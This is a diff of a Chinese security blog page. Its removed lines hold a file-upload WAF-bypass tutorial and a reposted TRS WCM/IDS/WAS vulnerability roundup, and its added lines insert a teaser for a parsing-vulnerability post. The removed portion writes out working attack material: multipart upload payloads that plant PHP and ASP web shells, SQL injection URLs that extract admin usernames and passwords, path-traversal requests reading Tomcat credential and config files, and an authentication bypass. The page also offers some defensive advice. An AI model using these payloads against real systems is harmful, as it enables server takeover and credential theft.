-<p>针对早期版本安全狗，可以多加一个filename</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--xYzZY</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"userfile"</span>; filename=<span class="string">"shell.jpg"</span>;filename=<span class="string">"shell.php"</span> <span class="comment">//多加一个filename</span></span><br><span class="line">Content-Type: image/gif</span><br><span class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="string">'command'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">--xYzZY-</span><br></pre></td></tr></table></figure>
-<p>或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--xYzZY</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"userfile"</span></span><br><span class="line">Content-Type: image/gif</span><br><span class="line">filename=<span class="string">"shell.php"</span>  <span class="comment">//把filemane放这里</span></span><br><span class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="string">'command'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">--xYzZY-</span><br></pre></td></tr></table></figure>
-<p><strong>2.8.3 POTS/GET</strong></p>
-<p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。</p>
-<p>此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p>
-<p><strong>2.8.4 利用waf本身缺陷</strong></p>
-<ul>
-<li>删除实体里面的Conten-Type字段</li>
-</ul>
-<p>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正常包：Content-Disposition: form-data; name=<span class="string">"image"</span>; filename=<span class="string">"085733uykwusqcs8vw8wky.png"</span>Content-Type: image/png</span><br><span class="line">构造包：Content-Disposition: form-data; name=<span class="string">"image"</span>; filename=<span class="string">"085733uykwusqcs8vw8wky.png</span></span><br><span class="line"><span class="string">C.php"</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li><p>删除Content-Disposition字段里的空格</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition:<span class="comment">/*这里空格删除*/</span>form-data; name=<span class="string">"userfile"</span>; filename=<span class="string">"shell.php"</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>增加一个空格导致安全狗被绕过案列：</p>
-</li>
-</ul>
-<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Content</span>-Type: <span class="keyword">multipart/form-data; </span><span class="keyword">boundary=—————————4714631421141173021852555099</span></span><br><span class="line"><span class="keyword">尝试在boundary后面加个空格或者其他可被正常处理的字符：</span></span><br><span class="line"><span class="keyword">boundary= </span>—————————<span class="number">47146314211411730218525550</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li><p>修改Content-Disposition字段值的大小写</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; <span class="attribute">nAme</span>=<span class="string">"userfile"</span>; <span class="attribute">filename</span>=<span class="string">"shell.php"</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>Boundary边界不一致</p>
-</li>
-</ul>
-<p>每次文件上传时的Boundary边界都是一致的：</p>
-<p>但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨：</p>
-<p>Win2k3 + IIS6.0 + ASP</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=--------------------------<span class="number">-471463142114117302185255</span>dddd <span class="comment">//修改</span></span><br><span class="line">Content-Length: <span class="number">253</span></span><br><span class="line">----------------------------<span class="number">-4714631421141173021852555099</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"file1"</span>; filename=<span class="string">"shell.asp"</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">&lt;%<span class="keyword">eval</span> request(<span class="string">"a"</span>)%&gt;</span><br><span class="line">----------------------------<span class="number">-4714631421141173021852555099</span>--</span><br></pre></td></tr></table></figure>
-<ul>
-<li><p>文件名回车</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">"file1"</span>; filename=<span class="string">"shell.ph</span></span><br><span class="line"><span class="string">p"</span> <span class="comment">//php中间回车</span></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>多个Content-Disposition</p>
-</li>
-</ul>
-<p>在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过</p>
-<p>Win2k8 + IIS7.0 + PHP</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: multipart/form-data; boundary=--------------------------<span class="number">-4714631421141173021852555099</span> </span><br><span class="line">Content-Length: <span class="number">253</span></span><br><span class="line">----------------------------<span class="number">-4714631421141173021852555099</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"file1"</span>; filename=<span class="string">"shell.php"</span></span><br><span class="line">----------------------------<span class="number">-4714631421141173021852555099</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"file1"</span>; filename=<span class="string">"shell.jpg"</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">&lt;%<span class="keyword">eval</span> request(<span class="string">"a"</span>)%&gt;</span><br><span class="line">----------------------------<span class="number">-4714631421141173021852555099</span>--</span><br></pre></td></tr></table></figure>
-<ul>
-<li>利用NTFS ADS 特性</li>
-</ul>
-<p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。</p>
-<table>
-<thead>
-<tr>
-<th>上传的文件名</th>
-<th>服务器表面现象</th>
-<th>生成的文件内容</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>Test.php:a.jpg</td>
-<td>生成Test.php</td>
-<td>空</td>
-</tr>
-<tr>
-<td>Test.php::$DATA</td>
-<td>生成test.php</td>
-<td>\&lt;?php phpinfo();?&gt;</td>
-</tr>
-<tr>
-<td>Test.php::$INDEX_ALLOCATION</td>
-<td>生成test.php文件夹</td>
-<td></td>
-</tr>
-<tr>
-<td>Test.php::$DATA.jpg</td>
-<td>生成0.jgp</td>
-<td>\&lt;?php phpinfo();?&gt;</td>
-</tr>
-<tr>
-<td>Test.php::$DATA\aaa.jpg</td>
-<td>生成aaa.jpg</td>
-<td>\&lt;?php phpinfo();?&gt;</td>
-</tr>
-</tbody>
-</table>
-<ul>
-<li>文件重命名绕过</li>
-</ul>
-<p>如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=<span class="string">"file1"</span>; filename=<span class="string">"shell...............................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">..............................................</span></span><br><span class="line"><span class="string">............................................php"</span></span><br></pre></td></tr></table></figure></p>
-<ul>
-<li>特殊的长文件名绕过</li>
-</ul>
-<p>文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">shell</span><span class="selector-class">.asp</span>;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王<span class="selector-class">.jpg</span></span><br></pre></td></tr></table></figure></p>
-<p><strong>2.8.5</strong> 其他绕过</p>
-<p>如服务器解析漏洞、文件包含漏洞等尝试绕过</p>
-<h3 id="2-9-HTTP不安全方法"><a href="#2-9-HTTP不安全方法" class="headerlink" title="2.9 HTTP不安全方法"></a>2.9 HTTP不安全方法</h3><p> 当服务器配置不当时，在不需要的上传页面的情况下导致任意文件上传（PUT协议） </p>
-<h2 id="0x03-文件校验的几点建议"><a href="#0x03-文件校验的几点建议" class="headerlink" title="0x03 文件校验的几点建议"></a>0x03 文件校验的几点建议</h2><ul>
-<li>上传文件的存储目录禁用执行权限</li>
-<li>文件扩展名服务端白名单校验，注意0x00截断攻击 </li>
-<li>文件内容服务端校验。</li>
-<li>上传文件重命名。</li>
-<li>隐藏上传文件路径。</li>
-</ul>
-<p>以上几点，可以防御绝大多数上传漏洞，但是需要跟服务器容器结合起来。如果解析漏洞依然存在，那么没有绝对的安全。 </p>
-<h2 id="附"><a href="#附" class="headerlink" title="附"></a>附</h2><p>php修复代码参考</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getExt</span> <span class="params">($filename)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> substr ($filename,strripos($filename,<span class="string">'.'</span>)+<span class="number">1</span>);    <span class="comment">//substr()函数返回字符串的一部分，strripos() 函数查找字符串从左到右在另一字符串中最后一次出现的位置  </span></span><br><span class="line">    &#125;  </span><br><span class="line">    $disallowed_types = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);  </span><br><span class="line">  </span><br><span class="line">    $FilenameExt = strtolower(getExt($_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]));     <span class="comment">//获取文件扩展名strtolower()将扩展名字符转换小写  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">//判断是否在允许的扩展名里  </span></span><br><span class="line"><span class="keyword">if</span> (!in_array($FilenameExt, $disallowed_types)) &#123;            <span class="comment">//如果获取文件扩展名不在白名单数组里，则返回disallowed type。  </span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"disallowed type"</span>);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"> <span class="keyword">else</span> &#123;  </span><br><span class="line">      </span><br><span class="line"><span class="comment">//文件名用time()函数获得10进制时间戳命名，在1-10000之间随机一个常数，防止同一秒不同用户上传文件重复，并最终用md5函数生成哈希散列命名文件。  </span></span><br><span class="line">     $filename = md5(time()+rand (<span class="number">1</span>,<span class="number">10000</span>)).<span class="string">"."</span>.$FilenameExt;         </span><br><span class="line">  </span><br><span class="line">    move_uploaded_file ($_FILES[<span class="string">"upfile"</span>][<span class="string">"tmp_name"</span>], <span class="string">"upload/"</span> . $filename);  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'文件上传成功，保存于：upload/'</span> . $filename . <span class="string">"\n"</span>;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+        
+          <p class="article-more-link ">
+            <a href="/fileupload/#more"><i class="fa fa-coffee" style="padding-right: 2px"></i>Read More</a>
+          </p>
+        
       
 
     </div>
@@ -1288,7 +449,7 @@ https://github.com/enochtangg/quick-SQL-cheatsheet/edit/master/README_zh-hans.md
 
     <footer class="article-footer">
       
-        <a data-url="http://pa55w0rd.github.io/fileupload/" data-id="cjopkqnqn002jj3t639tzhuvt" class="article-share-link" data-share="baidu" data-title="文件上传漏洞总结">分享到</a>
+        <a data-url="http://pa55w0rd.github.io/fileupload/" data-id="cjopl5ztd002lkbt68xc5q5hq" class="article-share-link" data-share="baidu" data-title="文件上传漏洞总结">分享到</a>
       
 
       
@@ -1314,9 +475,9 @@ https://github.com/enochtangg/quick-SQL-cheatsheet/edit/master/README_zh-hans.md
 
 
   
-    <article id="post-trs" class="article article-type-post" itemscope="" itemprop="blogPost">
+    <article id="post-解析漏洞" class="article article-type-post" itemscope="" itemprop="blogPost">
   <div data-scroll-reveal="enter top and over 0.7s" class="article-meta">
-    <a href="/trs/" class="article-date">
+    <a href="/解析漏洞/" class="article-date">
   <i class="fa fa-calendar"></i>
   <time datetime="2018-10-19T09:23:03.000Z" itemprop="datePublished">2018-10-19</time>
 </a>
@@ -1337,8 +498,8 @@ https://github.com/enochtangg/quick-SQL-cheatsheet/edit/master/README_zh-hans.md
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/trs/">
-        <i class="fa fa-pencil-square-o  article-title-icon"></i>TRS漏洞整理 （转发）</a>
+      <a class="article-title" href="/解析漏洞/">
+        <i class="fa fa-pencil-square-o  article-title-icon"></i>解析漏洞</a>
     </h1>
   
 
@@ -1348,59 +509,19 @@ https://github.com/enochtangg/quick-SQL-cheatsheet/edit/master/README_zh-hans.md
     
     <div class="article-entry" itemprop="articleBody">
       
-
-        <br>
-        <span id="busuanzi_container_page_pv">
-          阅读次数<span id="busuanzi_value_page_pv"></span>
-        </span>
-        <blockquote>
-<p>转自 <a href="https://chmod.cf/2017/06/22/TRS%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/" target="_blank" rel="noopener">https://chmod.cf/2017/06/22/TRS%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/</a></p>
-</blockquote>
-<ul>
-<li>目录<br>{:toc}</li>
-</ul>
-<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 <a href="前言">前言</a></h2><p>TRS北京拓尔思信息技术股份有限公司，其业务系统主要应用于政府、教育、企业等领域，漏洞较多系统有WCM（内容管理系统）、WAS（文本检索系统）、IDS（身份管理系统）。好多客户用到这个，记录一下</p>
-<h2 id="0x01-WCM内容管理系统"><a href="#0x01-WCM内容管理系统" class="headerlink" title="0x01 WCM内容管理系统"></a>0x01 <a href="WCM内容管理系统">WCM内容管理系统</a></h2><h3 id="1-1-WCM5-2-WCM6-5存在SQL注入"><a href="#1-1-WCM5-2-WCM6-5存在SQL注入" class="headerlink" title="1.1 WCM5.2~WCM6.5存在SQL注入"></a>1.1 <a href="WCM5.2~WCM6.5存在SQL注入">WCM5.2~WCM6.5存在SQL注入</a></h3><p>首先是这个页面，<a href="http://xx.xx.xx/portal/db/dbupdatelog_list.jsp" target="_blank" rel="noopener">http://xx.xx.xx/portal/db/dbupdatelog_list.jsp</a></p>
-<p>直接注入</p>
-<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http://agent.trs.cn/portal/db/db ... &amp;OrderType=desc;<span class="comment">/**/</span><span class="keyword">update</span><span class="comment">/**/</span>WCMDBUPDATELOG<span class="comment">/**/</span><span class="keyword">set</span><span class="comment">/**/</span>LogTitle=%<span class="number">28</span><span class="keyword">select</span><span class="comment">/**/</span>top<span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span>UserName%<span class="number">2</span>bPassWord<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>WCMUSER%<span class="number">29</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span>--&amp;OrderField=TableName&amp;SearchKey=CrTime&amp;PageItemCount=<span class="number">15</span>&amp;SearchTable=WCMDBUPDATELOG</span><br><span class="line"></span><br><span class="line">http://agent.trs.cn/portal/db/db ... &amp;OrderType=<span class="keyword">desc</span>;<span class="comment">/**/</span><span class="keyword">update</span><span class="comment">/**/</span>WCMDBUPDATELOG<span class="comment">/**/</span><span class="keyword">set</span><span class="comment">/**/</span>LogTitle=%<span class="number">28</span><span class="keyword">select</span><span class="comment">/**/</span>top<span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span>UserName%<span class="number">2</span>bPassWord<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>WCMUSER%<span class="number">29</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span>--&amp;OrderField=TableName&amp;SearchKey=CrTime&amp;PageItemCount=<span class="number">15</span>&amp;SearchTable=WCMDBUPDATELOG</span><br><span class="line"><span class="symbol">``</span><span class="symbol">`    </span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">注：存在注入参数为:`</span>OrderType<span class="symbol">`和`</span>OrderField<span class="symbol">`</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">### 1.2 [WCM任意文件下载漏洞](WCM任意文件下载漏洞)</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">漏洞存在于`</span>wcm/app/<span class="keyword">system</span>/read_image.jsp<span class="symbol">`读取上传图片功能处，可构造链接下载任意文件，列如</span></span><br></pre></td></tr></table></figure>
-<p><a href="http://xx.xx.xx/wcm/app/system/read_image.jsp?Filename=../../../tomcat/conf/tomcat-users.xml" target="_blank" rel="noopener">http://xx.xx.xx/wcm/app/system/read_image.jsp?Filename=../../../tomcat/conf/tomcat-users.xml</a><br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">读取`tomcat`配置文件</span><br><span class="line"></span><br><span class="line">### <span class="number">1.3</span> [WCM6.x系列用户密码泄漏](WCM6.x系列用户密码泄漏)</span><br><span class="line"></span><br><span class="line">TRS WCM <span class="number">6.0</span>以上版本某个功能页面调用`service`限制不严格，可以获取后台管理用户的用户名和密码序列。</span><br><span class="line"></span><br><span class="line">访问链接：</span><br></pre></td></tr></table></figure></p>
-<p>HTTP://xx.xx.xx/wcm/infoview.do?serviceid=wcm6_user&amp;MethodName=getOnlineUsers<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">WCM的密码加密方式是：常规`32`位`MD5`取前`15`位<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">如果只访问`wcm/infoview.do`，尽管是个错误页面，比如：</span><br><span class="line"></span><br><span class="line">首先访问</span><br></pre></td></tr></table></figure></p>
-<p><a href="http://xx.xx.xx/wcm/infoview.do" target="_blank" rel="noopener">http://xx.xx.xx/wcm/infoview.do</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">然后你再访问：</span><br></pre></td></tr></table></figure></p>
-<p><a href="http://xx.xx.xx/wcm" target="_blank" rel="noopener">http://xx.xx.xx/wcm</a><br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### <span class="number">1.4</span> [WCM用户注册逻辑漏洞](WCM用户注册逻辑漏洞)</span><br><span class="line"></span><br><span class="line">问题出在`wcm/console/auth/reg_newuser.jsp`文件中</span><br><span class="line"></span><br><span class="line">即将随意表单改成`STATUS`值为`<span class="number">30</span>`，或增加`STATUS`字段表单。</span><br><span class="line"></span><br><span class="line">然后提交注册</span><br><span class="line"></span><br><span class="line">虽然说是“请等待开通！”，但实际上已经开通了，因为`STATUS`字段已经改成正常了。</span><br><span class="line"></span><br><span class="line">直接登陆</span><br><span class="line"></span><br><span class="line">虽然没什么权限，但后台存在大量注入等漏洞</span><br><span class="line"></span><br><span class="line">可以通过注入直接操作数据库了。</span><br></pre></td></tr></table></figure></p>
-<p><a href="http://localhost:9999/wcm/file/read_file.jsp?FileName=U020120628383491551127/../../../../../Tomcat/webapps/wcm/WEB-INF/classes/trsconfig/domain/config.xml&amp;sDownName=xx" target="_blank" rel="noopener">http://localhost:9999/wcm/file/read_file.jsp?FileName=U020120628383491551127/../../../../../Tomcat/webapps/wcm/WEB-INF/classes/trsconfig/domain/config.xml&amp;sDownName=xx</a><br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### <span class="number">1.5</span> [WCM6权限绕过](WCM6权限绕过)</span><br><span class="line"></span><br><span class="line">首先访问wcm目录，会自动跳转到登录页面</span><br><span class="line"></span><br><span class="line">在网址后加上查看管理员密码的链接：</span><br></pre></td></tr></table></figure></p>
-<p>wcm/infoview.do?serviceid=wcm6_user&amp;MethodName=getUsersByNames&amp;UserNames=admin<br><code>`</code>    </p>
-<p>之前的漏洞说查看管理员信息的危害不大是因为<code>MD5</code>加密只取半截，并且即使破解还有可能遇到<code>admin</code>账号未启用的问题</p>
-<p>这时我们点击浏览器的后退按钮或在地址栏的网址后面直接输入<code>wcm/app/login.jsp</code>，这样就绕过权限登录了</p>
-<h3 id="1-6-WCM全版本任意文件写入漏洞"><a href="#1-6-WCM全版本任意文件写入漏洞" class="headerlink" title="1.6 WCM全版本任意文件写入漏洞"></a>1.6 <a href="WCM全版本任意文件写入漏洞">WCM全版本任意文件写入漏洞</a></h3><p>这个是16年年初出的漏洞，当初协助北京公司做过一次排查。</p>
-<p>是利用<code>webservices</code>的<code>importDocuments</code>接口匿名访问，加上畸形文件名进行利用，未找到poc</p>
-<h2 id="0x02-IDS身份管理系统"><a href="#0x02-IDS身份管理系统" class="headerlink" title="0x02 IDS身份管理系统"></a>0x02 <a href="IDS身份管理系统">IDS身份管理系统</a></h2><h3 id="2-1-IDS系统任意文件读取和信息泄露漏洞"><a href="#2-1-IDS系统任意文件读取和信息泄露漏洞" class="headerlink" title="2.1 IDS系统任意文件读取和信息泄露漏洞"></a>2.1 <a href="IDS系统任意文件读取和信息泄露漏洞">IDS系统任意文件读取和信息泄露漏洞</a></h3><p>漏洞文件路径在<code>admin/debug/</code>目录下，读取文件为<code>fv.jsp</code>，信息泄露为<code>env.jsp</code>等，直接访问文件即可</p>
-<h3 id="2-2-XXE漏洞"><a href="#2-2-XXE漏洞" class="headerlink" title="2.2 XXE漏洞"></a>2.2 <a href="XXE漏洞">XXE漏洞</a></h3><p>使用<code>DNS Log</code>进行记录</p>
-<pre><code>POST /ids/service?idsServiceType=jitSyncUser HTTP/1.1
-Host: **.**.**.**
-User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
-Accept-Encoding: gzip, deflate
-Cookie: trsidsssosessionid=2382B8AE9E8FB5B441212CE2595F963E**.**.**.**
-X-Forwarded-For: **.**.**.**
-Connection: keep-alive
-Content-Type: multipart/form-data; boundary=---------------------------1988224119974
-Content-Length: 196
-]&gt;&amp;xxe;
-</code></pre><p><a href="https://www.secpulse.com/archives/49564.html" target="_blank" rel="noopener">参考资料</a></p>
-<h2 id="0x03-WAS文本检索系统"><a href="#0x03-WAS文本检索系统" class="headerlink" title="0x03 WAS文本检索系统"></a>0x03 <a href="WAS文本检索系统">WAS文本检索系统</a></h2><h3 id="3-1-WAS未授权访问"><a href="#3-1-WAS未授权访问" class="headerlink" title="3.1 WAS未授权访问"></a>3.1 <a href="WAS未授权访问">WAS未授权访问</a></h3><p>安装目录下<code>was40/tree</code>文件可以看到一些后台功能</p>
-<p>访问<code>was40/passwd/passwd.htm</code>输入一个不存在的用户名会暴露出服务器内网IP地址 同时存在暴力破解用户密码的可能性</p>
-<h3 id="3-2-未授权发布信息"><a href="#3-2-未授权发布信息" class="headerlink" title="3.2 未授权发布信息"></a>3.2 <a href="未授权发布信息">未授权发布信息</a></h3><p>编辑信息的时候未对提交的数据进行过滤，同时存在未对用户是否登录进行验证</p>
-<h2 id="0x04-WAS任意文件读取"><a href="#0x04-WAS任意文件读取" class="headerlink" title="0x04 WAS任意文件读取"></a>0x04 <a href="WAS任意文件读取">WAS任意文件读取</a></h2><p>问题出在<code>/was5/web/tree</code>文件下，构造路径可以任意读取文件，这个就创宇提的那个漏洞</p>
-<pre><code>http://xx.xx.xx/was5/web/tree?treefile=/WEB-INF/classes/com/trs/was/resource/wasconfig.properties    
-</code></pre><h2 id="0x05-WAS任意文件下载漏洞"><a href="#0x05-WAS任意文件下载漏洞" class="headerlink" title="0x05 WAS任意文件下载漏洞"></a>0x05 <a href="WAS任意文件下载漏洞">WAS任意文件下载漏洞</a></h2><p>问题出在<code>was5/admin/template/download_templet.jsp</code>文件下，构造<code>type</code>参数的值可以任意下载文件，</p>
-<pre><code>http://xx.xx.xx/was5/admin/template/download_templet.jsp?type=../web/tagscloud    
-</code></pre><h2 id="0x06-WAS任意文件写入"><a href="#0x06-WAS任意文件写入" class="headerlink" title="0x06 WAS任意文件写入"></a>0x06 <a href="WAS任意文件写入">WAS任意文件写入</a></h2><p>漏洞文件是<code>was5/admin/template/customize/detailcustomize</code>,构造<code>template</code>的参数值进行任意文件写入</p>
-<p>同理还有一个问题文件<code>/was5/admin/template/customize/outlinecustomize</code>，利用方式一样</p>
-
+        <h2 id="IIS-5-x-6-0解析漏洞"><a href="#IIS-5-x-6-0解析漏洞" class="headerlink" title="IIS 5.x/6.0解析漏洞"></a>IIS 5.x/6.0解析漏洞</h2><ol>
+<li><p>目录解析</p>
+<p> 在网站下建立文件夹的名字为 .asp、.asa 的文件夹，其目录内的任何扩展名的文件都被IIS当作asp文件来解析并执行。</p>
+<p> 例如创建目录 xx.asp，那么/xx.asp/xx.jpg将被当作asp文件来执行。假设攻击者可以控制上传文件夹路径，就可以不管你上传后你的图片改不改名都能拿shell了。</p>
+<p> /xx.asp/xx.jpg</p>
+        
+          <p class="article-more-link ">
+            <a href="/解析漏洞/#more"><i class="fa fa-coffee" style="padding-right: 2px"></i>Read More</a>
+          </p>
+        
       
 
-    </div>
+    </li></ol></div>
 
 
 
@@ -1408,11 +529,11 @@ Content-Length: 196
 
     <footer class="article-footer">
       
-        <a data-url="http://pa55w0rd.github.io/trs/" data-id="cjopkqnmb001cj3t6wqr4p8ke" class="article-share-link" data-share="baidu" data-title="TRS漏洞整理 （转发）">分享到</a>
+        <a data-url="http://pa55w0rd.github.io/解析漏洞/" data-id="cjopl5zpo000qkbt6a7aus539" class="article-share-link" data-share="baidu" data-title="解析漏洞">分享到</a>
       
 
       
-        <a href="http://pa55w0rd.github.io/trs/#gitalk-container" class="article-comment-link">评论</a>
+        <a href="http://pa55w0rd.github.io/解析漏洞/#gitalk-container" class="article-comment-link">评论</a>
       
 
       
